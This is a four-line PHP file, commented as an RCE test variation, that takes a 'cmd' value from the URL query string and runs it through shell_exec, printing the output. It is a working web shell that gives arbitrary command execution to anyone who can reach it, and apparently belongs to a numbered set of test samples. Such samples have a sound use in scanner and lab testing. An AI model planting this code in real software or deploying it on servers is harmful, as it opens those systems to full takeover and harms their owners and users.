<?php
// RCE test variation #1118
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>